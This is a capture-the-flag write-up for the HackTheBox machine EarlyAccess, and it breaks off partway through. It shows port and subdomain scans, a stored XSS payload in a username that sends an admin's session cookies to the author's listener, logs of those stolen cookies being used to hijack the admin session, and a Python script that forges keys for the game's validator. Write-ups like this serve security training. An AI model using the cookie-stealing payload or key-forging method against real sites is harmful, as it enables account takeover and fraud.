---
title: HTB: EarlyAccess
url: https://0xdf.gitlab.io/2022/02/12/htb-earlyaccess.html
date: 2022-02-12T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, htb-earlyaccess, hackthebox, nmap, wfuzz, vhosts, php, laravel, xss, xss-cookies, python, injection, sqli, second-order, second-order-sqli, htb-nightmare, command-injection, api, php-filter, source-code, burp, burp-repeater, docker, container, password-reuse, wget, escape, arp, directory-traversal
---

![EarlyAccess](https://0xdfimages.gitlab.io/img/earlyaccess-cover.png)

When it comes to telling a story, EarlyAccess might be my favorite box on HackTheBox. It’s the box of a game company, with fantastic marketing on their front page for a game that turns out to be snake. I’ll need multiple exploits including XSS and second order SQLI to get admin on the signup site, abuse that to move the the game site, and from there to the dev site. From the dev site I’ll find a command injection to get a shell in the website’s docker container. I’ll abuse an API to leak another password to get onto the host. From there its back into another docker container, where I’ll crash the container to get execution and shell as root, getting access to the shadow file and a password for the host. Finally, I’ll abuse capabilities on arp to get read as root, the flag, and the root SSH key. In Beyond root, looking at a couple unintended paths.

## Box Info

| Name | [EarlyAccess](https://hackthebox.com/machines/earlyaccess)  [EarlyAccess](https://hackthebox.com/machines/earlyaccess) [Play on HackTheBox](https://hackthebox.com/machines/earlyaccess) |
| --- | --- |
| Release Date | [04 Sep 2021](https://twitter.com/hackthebox_eu/status/1433068810517598208) |
| Retire Date | 12 Feb 2022 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for EarlyAccess |
| Radar Graph | Radar chart for EarlyAccess |
| First Blood User | 01:45:44[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 02:06:55[celesian celesian](https://app.hackthebox.com/users/114435) |
| Creator | [Chr0x6eOs Chr0x6eOs](https://app.hackthebox.com/users/134448) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-05 10:00 EDT
Nmap scan report for earlyaccess.htb (10.10.11.110)
Host is up (0.100s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 103.76 seconds
oxdf@hacky$ nmap -p 22,80,443 -sCV -oA scans/nmap-tcpscripts 10.10.11.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-05 10:02 EDT
Nmap scan report for earlyaccess.htb (10.10.11.110)
Host is up (0.093s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
80/tcp  open  http     Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to https://earlyaccess.htb/
443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: EarlyAccess
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
| Not valid before: 2021-08-18T14:46:57
|_Not valid after:  2022-08-18T14:46:57
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.98 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) and [Apache](https://packages.debian.org/search?keywords=apache2) versions, the host is likely running Debian 10 Buster.

There’s a domain name in the TLS certificate on 443, `earlyaccess.htb`. The site on 80 is showing a redirect to `https://earlyaccess.htb`.

I’ll update `/etc/hosts` with this domain.

### VHost Brute Force

Given that I have a domain name, I’ll brute force for subdomains using `wfuzz`. The HTTPS site doesn’t return anything interesting, but the HTTP site does:

```

oxdf@hacky$ wfuzz -u http://10.10.11.110 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST: FUZZ.earlyaccess.htb" --hw 28
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.110/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000019:   200        55 L     129 W    2685 Ch     "dev"
000000194:   200        55 L     136 W    2709 Ch     "game"

Total time: 15.15456
Processed Requests: 4989
Filtered Requests: 4987
Requests/sec.: 329.2077

```

I’ll update `/etc/hosts` to add these two subdomains.

### earlyaccess.htb - TCP 443

#### Site

The HTTP page just redirects to HTTPS. The site is for a video game:

[![image-20210816163204721](https://0xdfimages.gitlab.io/img/image-20210816163204721.png)](https://0xdfimages.gitlab.io/img/image-20210816163204721.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210816163204721.png)

There’s an email address, admin@earlyaccess.htb. There’s also a links to login and to register for the early access beta.

The login page, `/login` presents a form:

![image-20210816163420930](https://0xdfimages.gitlab.io/img/image-20210816163420930.png)

Trying to guess some easy passwords for admin@earlyaccess.htb just returns errors:

![image-20210816163411842](https://0xdfimages.gitlab.io/img/image-20210816163411842.png)

The registration link (`/register`) presents another form:

![image-20210816163521200](https://0xdfimages.gitlab.io/img/image-20210816163521200.png)

I’ll register to get into the site.

#### Home

Once logged in, there are a handful more pages to view. The Home link leads to `/dashboard`:

![image-20210816170910844](https://0xdfimages.gitlab.io/img/image-20210816170910844.png)

It talks about receiving a Game-Key, which I obviously don’t have yet. It suggests messaging the administrative staff to get on the waiting list.

#### Messaging

The Messaging link has a dropdown with three options:

![image-20210816171014273](https://0xdfimages.gitlab.io/img/image-20210816171014273.png)

The first leads to `/messages/inbox`:

![image-20210816171055242](https://0xdfimages.gitlab.io/img/image-20210816171055242.png)

The outbox link in the dropdown and on the inbox page lead to `/messages/sent`, which looks the same but with a message saying I have no sent messages. The Contact Us link goes to `/contact`:

![image-20210816171240440](https://0xdfimages.gitlab.io/img/image-20210816171240440.png)

I’ll try sending a message asking for a code, and it displays from my outbox:

![image-20210816171317446](https://0xdfimages.gitlab.io/img/image-20210816171317446.png)

There’s an immediate reply as well:

![image-20210816171512753](https://0xdfimages.gitlab.io/img/image-20210816171512753.png)

Clicking on it shows the message:

![image-20210816171532960](https://0xdfimages.gitlab.io/img/image-20210816171532960.png)

The url to view a specific message is `/messages/1` for the sent message, and `/messages/2` for the automated response. After a few minutes, both messages are gone.

#### Forum

The Forum leads to `/forum`, where there’s a few posts:

![image-20210816171811256](https://0xdfimages.gitlab.io/img/image-20210816171811256.png)

The first one is an interesting hint, suggesting to look for SQL injection (or some other kind of injection) in the username:

![image-20210816172012610](https://0xdfimages.gitlab.io/img/image-20210816172012610.png)

There’s another one that talks about the Game-Key verification-API being buggy:

![image-20210816172131505](https://0xdfimages.gitlab.io/img/image-20210816172131505.png)

#### Store

The Store page (`/store`) doesn’t have much:

![image-20210816172227483](https://0xdfimages.gitlab.io/img/image-20210816172227483.png)

#### Register Key

The final link leads to `/key`, which has a form to associate a game key with my account:

![image-20210816172259788](https://0xdfimages.gitlab.io/img/image-20210816172259788.png)

I’ll try the example key in the placeholder text, but it just complains:

![image-20210816172421350](https://0xdfimages.gitlab.io/img/image-20210816172421350.png)

#### Profile

Clicking on my username at the top right drops a menu:

![image-20210816173707340](https://0xdfimages.gitlab.io/img/image-20210816173707340.png)

It has options to change my username, email, and password, to manage sessions, and delete my account:

![image-20210816173723295](https://0xdfimages.gitlab.io/img/image-20210816173723295.png)

#### Tech Stack

The HTTP response headers set two new cookies on each request:

```

HTTP/1.1 200 OK
Date: Mon, 16 Aug 2021 21:03:39 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.21
Cache-Control: no-cache, private
Set-Cookie: XSRF-TOKEN=eyJpdiI6Ik1GcEhjTVZrT3lBTHYrOVNWQ0ZCZnc9PSIsInZhbHVlIjoiUUJrK3RwVXFQL2drUUtWNWRUNDBBV0svczZUTHV0dTBNTlY0ZEsvdlExUDRXbFhXWjdrNW9DQW1ST3hxY3ByMGFDcVJlL0hQWVEzZmFITklWODJaUi9nNktOSkprcHhJTmIySWJUTUx4YTNneTV6ZjJIOG5xM2VlQ2lrR0pYem8iLCJtYWMiOiI2YTgwMjJjZjg4ODljYjE2ODBjNzRhNzI2MzQ0MTk3ZWIwZWVkY2UzNzRkMWMzMjgxZDA5OGJiN2ZiNDZiY2ZiIn0%3D; expires=Mon, 16-Aug-2021 23:03:39 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: earlyaccess_session=eyJpdiI6IjQ1Qm1tMlBMdk9WOUpnOWxMWnEyZFE9PSIsInZhbHVlIjoidXhPR1BQSlpJYnorTjQrNWVyQ2w4SHJiaHdSSEtHOUQ2bXlENGtuWnlHNVNKWmQzTjhHT1Z2Zkp0dlJnWDRQd20wVWhZaVdieVB2bWhsa29KRmgxSHNvdlg4SlI5cDAraG5tdlI0RXhCMGVVMmdMZFlXSWlkdE9Yb0FMbktIZngiLCJtYWMiOiIwMTZkNWVkMjYwYjkyZjYwNWEyYjk3YjM4NDM0MzBlNmRiODcwZjQ5MzgzMjFiMWFmYmZkNDQ3ZDhkMzMxZWJlIn0%3D; expires=Mon, 16-Aug-2021 23:03:39 GMT; Max-Age=7200; path=/; samesite=lax
Vary: Accept-Encoding
Content-Length: 12396
Connection: close
Content-Type: text/html; charset=UTF-8

```

Both cookies look like Flask Cookies, and can be decoded [here](https://www.kirsle.net/wizards/flask-session.cgi). This is quite weird given the headers also show PHP. It turns out they are actually Laravel cookies, which I guess decode the same as Flask cookies.

The first decodes to:

```

{
    "iv": "MFpHcMVkOyALv+9SVCFBfw==",
    "mac": "6a8022cf8889cb1680c74a726344197eb0eedce374d1c3281d098bb7fb46bcfb",
    "value": "QBk+tpUqP/gkQKV5dT40AWK/s6TLutu0MNV4dK/vQ1P4WlXWZ7k5oCAmROxqcpr0aCqRe/HPYQ3faHNIV82ZR/g6KNJJkpxINb2IbTMLxa3gy5zf2H8nq3eeCikGJXzo"
}

```

The second:

```

{
    "iv": "45Bmm2PLvOV9Jg9lLZq2dQ==",
    "mac": "016d5ed260b92f605a2b97b3843430e6db870f4938321b1afbfd447d8d331ebe",
    "value": "uxOGPPJZIbz+N4+5erCl8HrbhwRHKG9D6myD4knZyG5SJZd3N8GOVvfJtvRgX4Pwm0UhYiWbyPvmhlkoJFh1HsovX8JR9p0+hnmvR4ExB0eU2gLdYWIidtOXoALnKHfx"
}

```

This isn’t very useful to me, and I’m not sure what to make of PHP with Flask cookies.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and it finds a bit, and then doesn’t find anything else, and the error count starts going up fast (so I’ll Ctrl-c):

```

oxdf@hacky$ feroxbuster -k -u https://earlyaccess.htb 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://earlyaccess.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      321c https://earlyaccess.htb/images
302       12l       22w      362c https://earlyaccess.htb/forum
200       83l      161w     3026c https://earlyaccess.htb/login
200       84l      159w     2902c https://earlyaccess.htb/register
301        9l       28w      318c https://earlyaccess.htb/css
302       12l       22w      362c https://earlyaccess.htb/admin
301        9l       28w      317c https://earlyaccess.htb/js
302       12l       22w      362c https://earlyaccess.htb/contact
405        0l        0w        0c https://earlyaccess.htb/logout
🚨 Caught ctrl+c 🚨 saving scan state to ferox-https_earlyaccess_htb-1630411505.state ...
[#>------------------] - 48s     6413/119996  14m     found:9       errors:297    
[#>------------------] - 48s     1681/29999   34/s    https://earlyaccess.htb
[#>------------------] - 47s     1602/29999   33/s    https://earlyaccess.htb/images
[#>------------------] - 46s     1568/29999   34/s    https://earlyaccess.htb/css
[#>------------------] - 45s     1558/29999   33/s    https://earlyaccess.htb/js

```

If I reload the page now, there’s a message:

![image-20210818143347501](https://0xdfimages.gitlab.io/img/image-20210818143347501.png)

So that explains why nothing else was discovered. Nothing in here is really useful beyond what I’ve found on the site. After a minute or two I’m allowed back to the site.

### game.earlyaccess.htb - TCP 80

This page presents a login form:

![image-20210816172606281](https://0xdfimages.gitlab.io/img/image-20210816172606281.png)

Trying to login with the account I created rejects because I have not registered an access key with my account:

![image-20210816172553740](https://0xdfimages.gitlab.io/img/image-20210816172553740.png)

### dev.earlyaccess.htb - TCP 80

This site also has a login form, and the email is prefilled and can’t be changed:

![image-20210816173543795](https://0xdfimages.gitlab.io/img/image-20210816173543795.png)

I tried some password guessing and basic SQL injections, but didn’t get anywhere.

## Admin Access to Site

### Special Character Username

The forum post mentioned that things crashed when there were special characters in a username. If I log out and try to create another user, 0xdf’, it rejects it:

![image-20210816174611915](https://0xdfimages.gitlab.io/img/image-20210816174611915.png)

I’ll test a few other special characters by hand like `'`, `"`, `<`, `>`, `?`, `=`, and all are rejected.

Logged back in, on the profile page, I’ll try the same attach at the name change, and it works:

![image-20210816175021325](https://0xdfimages.gitlab.io/img/image-20210816175021325.png)

### Identify XSS

I’ll try sending some messages, but nothing seems to trigger any second order SQL injections (like in [Nightmare](/2018/07/07/second-order-sql-injection-on-htb-nightmare.html)):

![image-20210816175341760](https://0xdfimages.gitlab.io/img/image-20210816175341760.png)

Next I’ll check HTML elements. It doesn’t work in the username display at the top of the page:

![image-20210816175652748](https://0xdfimages.gitlab.io/img/image-20210816175652748.png)

But when I send a message, it does:

![image-20210816175705102](https://0xdfimages.gitlab.io/img/image-20210816175705102.png)

This means that the site is likely vulnerable to a cross-site scripting (XSS) attack if someone is looking at the messages.

### Steal Cookies

Typically I like to use XSS payloads of the format `<script src="[url of my box]"></script>` for XSS testing, but that will require setting up an HTTPS server here, as the page is served over HTTPS. I’ll start with a simple `document.location` test by updating my username to:

```

0xdf<script>document.location="http://10.10.14.6/"+document.cookie;</script>

```

If that is processed as HTML, then anyone viewing it will send their cookie to my server in the URL. I’ll start a Python webserver to listen for requests.

On sending a message, when I click on it, I’m immediately redirected to a 404:

![image-20210816180202436](https://0xdfimages.gitlab.io/img/image-20210816180202436.png)

The logs from the Python webserver show the hit, which containers the request contains my cookies:

```
10.10.14.6 - - [05/Sep/2021 10:04:30] "GET /earlyaccess_session=eyJpdiI6IldPUC93RS82eFN0QU9uUnI1cW8zdlE9PSIsInZhbHVlIjoiVGlBd25kMU9HZWR2U3ZuRTVTM283QW5WRzhsbS9DbjNLcVZxbkt1ZkVCM2FXb1o4K0VaZ1kzd3NpTVBQK1FVeG8wbTdJRFYwWko3Tkw4WDVmakRTRzBuQ1FRVlBPdDVqaDViZlB5MENUWmFjWUgxbEdFTmV0MElXUnY3VWVycDkiLCJtYWMiOiJjOGE4ZjJmNzc5OThjOTJjNjAyZWI1OTZjZmMxNTlkYWQ4Mzg3OWUwZWE1YmVkZWYzNWY4ZmYxMDgwODQ3NjdiIn0%3D;%20XSRF-TOKEN=eyJpdiI6IkVwTzFYSHhsSEdkU1RmcnphdTN6Q3c9PSIsInZhbHVlIjoiNE54ZmcxMk0zZWEzOSs3MW92d1I2ZGtJS3NZQ1B0eDE0T0RHaGdTa24rVVpoUTJQeFU5Z3hIUHdQckpnMEFrRXJHNHpERk8ydGNWTi9EdGxUTmZFRDlBOU1yV2t1Y294MWZleGQrcVlORE9mSEZHaHJXY1hhYzNyeW9aaERxRGYiLCJtYWMiOiIwZWY2OGRmODdlZDYxZGRmOGY1MDEwMzUwYmNkNDU0ZWY5NDBkNWYxZjA0MTMyYjE1N2M5MDhmZmMzYmQzOGNjIn0%3D HTTP/1.1" 404

```

Less than a minute later, there’s a request from EarlyAccess with a cookie:

```
10.10.11.110 - - [05/Sep/2021 10:04:42] "GET /XSRF-TOKEN=eyJpdiI6Inowei9ZYlV3SDI2QlJGeHRoZTBsT1E9PSIsInZhbHVlIjoiQ0tRMDhFMjM2SE5yQzRzKzZLL2tUbGxQNXZ5ZnlMMkpRV2pqWTY2ZVY0Y21JTzN0aG40MS9xNWNCMU1rYk5ERnBzVUNpY0tqa1craW8yZkw3MnlzMHQyS1Y4cEFYZUMxZ3dwek5rSHRTY05jaVZVR2hsNDNjQk05eHV3RlhnQTIiLCJtYWMiOiJiMDAyOTBkODNlOTRhN2M4NDAwN2ViNGUyNWQzMjkzYTJiYjVmYjQ4MTYxNDNhZmExNDcwYzRkZTFmZjExMzRjIn0%3D;%20earlyaccess_session=eyJpdiI6IlpZV0VZUnU4V09HTUdONHEzQ3ZBMEE9PSIsInZhbHVlIjoiZVVqaDduTXcwcWJMdC9PUGl4U1QzcHZTVkYzdkJ6ZVM2SlJWKzZrNGhxelBGLzBZTjhic0djaGJqTXM3NWNGeGtlR05CSXZsSkdCb3oyZGNORWpYM3BHM2xvUGhKWmJFOFZ6ZVVIK2hlMHNIVU1YOWxEaXhJaUJMY3ZKYTJUNFAiLCJtYWMiOiJhMmU3YmYyYzhmNjk3YmFhZTc4ZjExNWIyMThlYTU1MzZhYmMzMGIwOWM2Mzc3OGNkM2IyODU0ZmRiNzBiM2FkIn0%3D HTTP/1.1" 404 -

```

When I replace my cookies in Firefox with these and refresh, I’m logged in as admin:

![image-20210817065752145](https://0xdfimages.gitlab.io/img/image-20210817065752145.png)

## Game Access

### Enumeration

As admin, the site has different menu options at the top. “Dev” and “Game” lead to the subdomains I found earlier (`dev.earlyaccess.htb` and `game.earlyaccess.htb`). I still can’t log into dev without the admin password, and game still requires and account with a game key associated with it.

“Admin” has a dropdown menu:

![image-20210817094118871](https://0xdfimages.gitlab.io/img/image-20210817094118871.png)

“Admin panel” (`/admin`) leads to a page which lists users:

![image-20210817094411124](https://0xdfimages.gitlab.io/img/image-20210817094411124.png)

“User management” (`/users`) says it’s still under construction:

![image-20210817094435542](https://0xdfimages.gitlab.io/img/image-20210817094435542.png)

“Download backup” `(/admin/backup`) has a message about issues with the API, and provides a button to download the offline validator. It also mentions the “magic\_num” that must be entered into the validator.

![image-20210817094543977](https://0xdfimages.gitlab.io/img/image-20210817094543977.png)

I’ll download `backup.zip`.

“Verify a key” (`/key`) has a form to do that:

![image-20210817094616419](https://0xdfimages.gitlab.io/img/image-20210817094616419.png)

When I enter a key on this one, it’s similar to the regular user form, except this time it gives debug information:

![image-20210817094701045](https://0xdfimages.gitlab.io/img/image-20210817094701045.png)

There’s actually a bit more that can be done here, including leaking the magic number, but I didn’t see it until getting access to the site. I’ll look into that in [Beyond Root](#magic-number-leak).

### validate.py

#### Overview

The zip contains a single Python script, `validate.py`, which is meant to be a hackable serial number challenge. The author of EarlyAccess said it was inspired by [this StackSmashing YoutTube video](https://www.youtube.com/watch?v=cwyH59nACzQ).

Running it prints the help:

```

oxdf@hacky$ python3 validate.py 

        # Game-Key validator #

        Can be used to quickly verify a user's game key, when the API is down (again).

        Keys look like the following:
        AAAAA-BBBBB-CCCC1-DDDDD-1234

        Usage: validate.py <game-key>

```

It defines a `Key` class, and has a short `main` function:

```

if __name__ == "__main__":
    if len(sys.argv) != 2:    
        print(Key.info())     
        sys.exit(-1)         
    input = sys.argv[1] 
    validator = Key(input) 
    if validator.check():     
        print(f"Entered key is valid!")
    else:                                  
        print(f"Entered key is invalid!")

```

The script takes the first arg and uses it to create a `Key` object. Then it calls `check()` on it, and prints the result.

The `Key` class has a few constants defined at the top, including the `magic_num` referenced on the page with a comment that it changes every 30 minutes:

```

class Key:    
    key = ""    
    magic_value = "XP" # Static (same on API)    
    magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)    
    
    def __init__(self, key:str, magic_num:int=346):    
        self.key = key    
        if magic_num != 0:    
            self.magic_num = magic_num 

```

`check()` is a series of calls to other functions:

```

    def check(self) -> bool:
        if not self.valid_format():
            print('Key format invalid!')
            return False
        if not self.g1_valid():
            return False
        if not self.g2_valid():
            return False
        if not self.g3_valid():
            return False
        if not self.g4_valid():
            return False
        if not self.cs_valid():
            print('[Critical] Checksum verification failed!')
            return False
        return True

```

I’m going to try to generate a valid key, so I’ll need each of these to return True. `valid_format()` just uses the regex module (`re`) to make sure the key has the format `XXXXX-XXXXX-AAAA1-XXXXX-12222`, where `X` is a capital letter or number, `A` is a capital letter, `1` is a number, and `2` is an optional number:

```

    def valid_format(self) -> bool:
        return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))

```

Each of the `g_valid` functions splits the key on `-`, and then looks at the respective section.

#### g1

`g1_valid` has three checks:

```

    def g1_valid(self) -> bool:
        g1 = self.key.split('-')[0]
        r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
        if r != [221, 81, 145]:
            return False                                     
        for v in g1[3:]:
            try:   
                int(v)
            except:       
                return False
        return len(set(g1)) == len(g1)

```

The first three characters are converted to their ordinal numbers, and then left bit shifted by one, two, and three bits respectively. Then the result is XORed against the original number, and the result needs to be 221, 81, 145.

To get the first character, I can use a simple loop in a Python terminal:

```

>>> for i in range(256):
...     if (i<<1)%256^i == 221:
...         print(chr(i))
... 
K

```

In fact, I can create a slightly bigger loop that finds all three:

```

>>> for j, x in enumerate([221, 81, 145]):
...     for i in range(256):
...         if (i<<(j+1))%256^i == x:
...             print(chr(i))
... 
K
E
Y

```

The last two characters need to not crash `int(v)`, so any digit will do.

The final check is that the `len(set(g1)) == len(g1)`. This means that each characters must be unique.

I’m going to start with a strategy of picking one value where many might work. If I reach a place where there’s no valid options based on some earlier arbitrary choice, I’ll revisit that. So the I’ll use `KEY12` for the first section.

#### g2

This section is a bit simpler:

```

    def g2_valid(self) -> bool:
        g2 = self.key.split('-')[1]
        p1 = g2[::2]
        p2 = g2[1::2]
        return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))

```

It gets the second group, and then separates the odd and even indexed characters such that `ABCDE` becomes `ACE` and `BD`.

In Python3, doing `sum(bytearray(string.encode()))` will return the sum of the ordinal values of the string. For example:

```

>>> p1 = 'ACE'
>>> sum(bytearray(p1.encode()))
201
>>> ord('A') + ord('C') + ord('E')
201

```

So if I start with the lowest ASCII character that’s valid to put in, I could set the odd three characters to `0`. The ordinal value of `0` is 48:

```

>>> ord('0')
48

```

So what character has an ordinal value that when multiplied by two is equal to 48 times three?

```

>>> ord('0')*3/2
72.0
>>> chr(ord('0')*3//2)
'H'

```

I’ll use `0H0H0` for the second section. To show that works:

```

>>> g2 = "0H0H0"
>>> p1 = g2[::2]
>>> p2 = g2[1::2]
>>> sum(bytearray(p1.encode()))
144
>>> sum(bytearray(p2.encode()))
144

```

#### g3

This section is a bit trickier, as now it depeneds on the magic number which is supposedly changing every 30 minutes:

```

    def g3_valid(self) -> bool:
        # TODO: Add mechanism to sync magic_num with API
        g3 = self.key.split('-')[2]
        if g3[0:2] == self.magic_value:
            return sum(bytearray(g3.encode())) == self.magic_num
        else:
            return False

```

I know from the validation that this section has four uppercase letters followed by a digit. The first two characters are `XP`, as the `magic_value` is static.

When the ordinal values of this section are summed, it equals the magic number that I don’t know. At first look, there are 26\*26\*10 = 6760 possible values that could fill those last three digits.

Still, I can think about the range of possible magic numbers. The lowest one will be `XPAA0`, which has a magic number of 346:

```

>>> sum(bytearray(b'XPAA0'))
346

```

I know this is lowest because “A” is the lowest ordinal value of the capital letters and “0” is the lowers of the digits. The highest one will be `XPZZ9`, or 405:

```

>>> sum(bytearray(b'XPZZ9'))
405

```

This is useful because now I’ve reduced the brute force space from 6760 to 60, as there are only 60 possible magic numbers.

Another way to show the same thing would be this loop:

```

>>> from collections import defaultdict
>>> magic_nums = defaultdict(list)
>>> for c1 in string.ascii_uppercase:
...     for c2 in string.ascii_uppercase:
...         for d in string.digits:
...             num = sum(bytearray(b'XP' + (c1 + c2 + d).encode()))
...             magic_nums[num].append(f'XP{c1}{c2}{d}')
...  

```

This will create a defaultdict of lists, and then for each possible key, calculate the “magic number” that might match what’s on the server. It will add each key to the list in `magic_nums`.

`magic_nums` has keys from 346 to 405:

```

>>> magic_nums.keys()
dict_keys([346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405])

```

I can do silly stuff like show how many keys make each magic number:

```

>>> import matplotlib.pyplot as plt
>>> plt.bar(magic_nums.keys(), [len(magic_nums[k]) for k in magic_nums])
<BarContainer object of 60 artists>
>>> plt.xlabel('Magic Number')
Text(0.5, 0, 'Magic Number')
>>> plt.ylabel('Number of Keys')
Text(0, 0.5, 'Number of Keys')
>>> plt.show()

```

![image-20220209153938535](https://0xdfimages.gitlab.io/img/image-20220209153938535.png)

#### g4

The fourth section is a character by character XOR between the first and fourth sections:

```

    def g4_valid(self) -> bool:
        return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]

```

I can simply XOR the target values with the string I’ve decided to use from g1 to get a valid g4:

```

>>> [chr(ord(g)^i) for g,i in zip('KEY12', [12, 4, 20, 117, 0])]
['G', 'A', 'M', 'D', '2']

```

I had some choice in the last two characters of g1. If I had picked something that didn’t XOR to a valid character for the fourth character here, I could have adjusted it there, but it seems to work ok. The fifth character couldn’t fail, since it’s target is zero, so it just XORs with itself.

#### cs

The `cs_valid()` function pulls the final set of digits from the key and convert it to an int. This is the checksum. It compares that to `calc_cs()` to ensure it’s good.

```

    def cs_valid(self) -> bool:
        cs = int(self.key.split('-')[-1])
        return self.calc_cs() == cs

```

`calc_cs` just sums the ordinal values of the rest of the sections:

```

    def calc_cs(self) -> int:      
        gs = self.key.split('-')[:-1]                                    
        return sum([sum(bytearray(g.encode())) for g in gs])

```

I can just use this function to generate a valid checksum.

### Generate Key

I have static values for `g1`, `g2`, and `g4`. I also have code to calculate the checksum:

```

#!/usr/bin/env python3    

def calc_cs(key) -> int:    
    gs = self.key.split('-')[:-1]    
    return sum([sum(bytearray(g.encode())) for g in gs])    

g1 = "KEY12"    
g2 = "0H0H0"
g4 = "GAMD2" 

```

I’ll need to calculate a `g3` value for each of the 60 possible magic numbers. This loop isn’t efficient (it does 26 x 26 x 10 = 6760 calculations instead of 60), but it works and is still instant in Python:

```

g3s = {}
for c1 in string.ascii_uppercase:
    for c2 in string.ascii_uppercase:
        for d in string.digits:
            g3 = f'XP{c1}{c2}{d}'
            magic_num = sum(bytearray(g3.encode()))
            g3s[magic_num] = g3

```

Basically it calculates all possible last three strings, and each time, puts that string into the dictionary based on the magic number. So most of these will be overwritten many times, but it doesn’t matter. It’s still fast, and I’m left with a dictionary giving me one string for each magic number, which is all I need.

If I add a `print(g3s)` at the end and run this, it’s instant and gives what I’m looking for:

```

oxdf@hacky$ time python3 generate_keys.py 
{346: 'XPAA0', 347: 'XPBA0', 348: 'XPCA0', 349: 'XPDA0', 350: 'XPEA0', 351: 'XPFA0', 352: 'XPGA0', 353: 'XPHA0', 354: 'XPIA0', 355: 'XPJA0', 356: 'XPKA0', 357: 'XPLA0', 358: 'XPMA0', 359: 'XPNA0', 360: 'XPOA0', 361: 'XPPA0', 362: 'XPQA0', 363: 'XPRA0', 364: 'XPSA0', 365: 'XPTA0', 366: 'XPUA0', 367: 'XPVA0', 368: 'XPWA0', 369: 'XPXA0', 370: 'XPYA0', 371: 'XPZA0', 372: 'XPZB0', 373: 'XPZC0', 374: 'XPZD0', 375: 'XPZE0', 376: 'XPZF0', 377: 'XPZG0', 378: 'XPZH0', 379: 'XPZI0', 380: 'XPZJ0', 381: 'XPZK0', 382: 'XPZL0', 383: 'XPZM0', 384: 'XPZN0', 385: 'XPZO0', 386: 'XPZP0', 387: 'XPZQ0', 388: 'XPZR0', 389: 'XPZS0', 390: 'XPZT0', 391: 'XPZU0', 392: 'XPZV0', 393: 'XPZW0', 394: 'XPZX0', 395: 'XPZY0', 396: 'XPZZ0', 397: 'XPZZ1', 398: 'XPZZ2', 399: 'XPZZ3', 400: 'XPZZ4', 401: 'XPZZ5', 402: 'XPZZ6', 403: 'XPZZ7', 404: 'XPZZ8', 405: 'XPZZ9'}

real    0m0.024s
user    0m0.016s
sys     0m0.008s

```

I can update this into a loop to generate all the keys needed:

```

for mn in g3s:
    key = f'{g1}-{g2}-{g3s[mn]}-{g4}-'
    cs = calc_cs(key)
    key = f'{key}{cs}'
    print(f'{mn}: {key}')  

```

As shown above, it will just print each key:

```

oxdf@hacky$ python3 generate_keys.py 
346: KEY12-0H0H0-XPAA0-GAMD2-1297
